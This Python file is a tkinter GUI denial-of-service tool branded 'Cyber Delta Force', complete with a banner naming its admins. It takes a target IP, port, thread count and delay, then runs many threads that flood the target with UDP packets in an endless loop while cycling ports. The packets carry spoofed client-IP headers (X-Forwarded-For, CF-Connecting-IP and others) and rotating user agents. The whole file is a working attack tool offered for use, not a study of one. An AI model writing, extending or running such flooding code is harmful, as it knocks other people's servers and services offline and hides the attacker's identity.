import tkinter as tk
from tkinter import filedialog, messagebox
from time import strftime
import socket
import random
import threading
import time

# === CDF ASCII LOGO ===
CDF_LOGO = r"""
            ░
 ██████╗░░░░██████╗░░░░░███████╗
██╔════╝░░░░██╔══██╗░░░░██╔════╝
██║░░░░░░░░░██║░░██║░░░░█████╗
██║░░░░░░░░░██║░░██║░░░░██╔══╝
╚██████╗░░░░██████╔╝░░░░██║
 ╚═════╝░ ░ ╚═════╝  ░░ ╚═╝
         ░          ░  ░

+───────────────────────────────────────+
|                                       |
|              <HTTP/>                  |
|           💥 FUCKED START 💥          |
|        WE SCAN • WE EXPLOIT           |
|         ⚔ Cyber Delta Force ⚔         |
|  Admins: x!t_eXploiteR | osker999     |
|               Astro Blaze             |
+───────────────────────────────────────+
"""

# Clock display
def time_now():
    string = strftime('%H:%M:%S %p')
    clock_label.config(text=string)
    clock_label.after(1000, time_now)

# Hardcoded headers fallback
def hardcoded_headers(ip):
    spoof = f"{random.randint(11,197)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(2,254)}"
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Linux; Android 11; SM-A505F)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
    ]
    ua = random.choice(user_agents)
    headers = [
        "Accept: */*",
        "Accept-Encoding: gzip, deflate",
        "Connection: keep-alive",
        f"X-Forwarded-For: {spoof}",
        f"X-Real-IP: {spoof}",
        f"True-Client-IP: {spoof}",
        f"CF-Connecting-IP: {spoof}",
        f"User-Agent: {ua}",
        f"Host: {ip}"
    ]
    return headers

# Load headers from file
def load_headers_from_file(ip, filepath):
    headers = []
    try:
        with open(filepath, "r", encoding="utf-8") as file:
            lines = file.readlines()
            for line in lines:
                if ":" in line:
                    key, val = line.strip().split(":", 1)
                    spoof = f"{random.randint(11,197)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(2,254)}"
                    if "ip" in val.lower():
                        val = spoof
                    headers.append(f"{key.strip()}: {val.strip()}")
    except Exception as e:
        messagebox.showerror("Error", f"Cannot read file: {e}")
        return hardcoded_headers(ip)
    headers.append(f"Host: {ip}")
    return headers

# Attack worker
def attack_worker(ip, port, delay, use_file, filepath):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while True:
        try:
            if use_file and filepath:
                hdrs = load_headers_from_file(ip, filepath)
            else:
                hdrs = hardcoded_headers(ip)
            payload = "\r\n".join(hdrs) + "\r\n\r\n"
            sock.sendto(payload.encode(), (ip, port))
            sent += 1
            port = port + 1 if port < 65534 else 1
            output_text.insert(tk.END, f"[🚀] Sent {sent} packets to {ip}:{port}\n")
            output_text.see(tk.END)
            time.sleep(delay)
        except Exception as err:
            output_text.insert(tk.END, f"[❌] Error: {err}\n")
            break

# Start attack threads
def start_attack_thread():
    ip = ip_entry.get()
    try:
        port = int(port_entry.get())
        threads = int(threads_entry.get())
        delay = float(delay_entry.get())
    except ValueError:
        messagebox.showerror("Input Error", "Please enter valid numbers for Port, Threads and Delay.")
        return

    if use_file_var.get() == 1 and not header_file_path.get():
        messagebox.showerror("Input Error", "Please select a header.txt file or uncheck the option.")
        return

    output_text.delete(1.0, tk.END)
    output_text.insert(tk.END, "[⚔️] Attack started...\n")

    for i in range(threads):
        t = threading.Thread(target=attack_worker, args=(ip, port, delay, use_file_var.get()==1, header_file_path.get()), daemon=True)
        t.start()

# Browse file dialog
def browse_file():
    filename = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
    if filename:
        header_file_path.set(filename)
        file_label.config(text=f"Loaded: {filename.split('/')[-1]}")

# GUI Setup
root = tk.Tk()
root.title("⚔ CDF - DDOS with header.txt option")
root.geometry("650x700")
root.configure(bg="#0d0d0d")

# Logo Label
logo_label = tk.Label(root, text=CDF_LOGO, font=("Courier", 8, "bold"), fg="#00ff99", bg="#0d0d0d", justify="left")
logo_label.pack(pady=5)

clock_label = tk.Label(root, font=('Consolas', 14, 'bold'), bg='#000000', fg='#00ffcc')
clock_label.pack(pady=5)
time_now()

ip_label = tk.Label(root, text="🌐 Target IP Address", font=('Segoe UI', 12), bg="#0d0d0d", fg="#ffffff")
ip_label.pack(pady=(10, 0))
ip_entry = tk.Entry(root, width=30, font=('Segoe UI', 12))
ip_entry.pack(pady=5)

port_label = tk.Label(root, text="📡 Port", font=('Segoe UI', 12), bg="#0d0d0d", fg="#ffffff")
port_label.pack(pady=(10, 0))
port_entry = tk.Entry(root, width=30, font=('Segoe UI', 12))
port_entry.pack(pady=5)

threads_label = tk.Label(root, text="🧵 Number of Threads", font=('Segoe UI', 12), bg="#0d0d0d", fg="#ffffff")
threads_label.pack(pady=(10, 0))
threads_entry = tk.Entry(root, width=30, font=('Segoe UI', 12))
threads_entry.insert(0, "50")
threads_entry.pack(pady=5)

delay_label = tk.Label(root, text="⏱️ Delay between packets (seconds)", font=('Segoe UI', 12), bg="#0d0d0d", fg="#ffffff")
delay_label.pack(pady=(10, 0))
delay_entry = tk.Entry(root, width=30, font=('Segoe UI', 12))
delay_entry.insert(0, "0.001")
delay_entry.pack(pady=5)

use_file_var = tk.IntVar()
use_file_checkbox = tk.Checkbutton(root, text="Use header.txt file for headers", variable=use_file_var,
                                  bg="#0d0d0d", fg="#00ff99", selectcolor="#0d0d0d", font=("Segoe UI", 12, "bold"))
use_file_checkbox.pack(pady=10)

header_file_path = tk.StringVar()
file_label = tk.Label(root, text="No file loaded", bg="#0d0d0d", fg="#888888", font=("Segoe UI", 10))
file_label.pack()

browse_btn = tk.Button(root, text="📂 Browse header.txt", command=browse_file, bg="#004488", fg="white", font=("Segoe UI", 12))
browse_btn.pack(pady=5)

attack_btn = tk.Button(root, text="🔥 LAUNCH ATTACK", command=start_attack_thread, bg="#ff0044", fg="white", font=("Segoe UI", 14, "bold"))
attack_btn.pack(pady=20)

output_text = tk.Text(root, height=20, width=80, bg="#1a1a1a", fg="#00ff99", font=("Consolas", 10))
output_text.pack(pady=10)

root.mainloop()
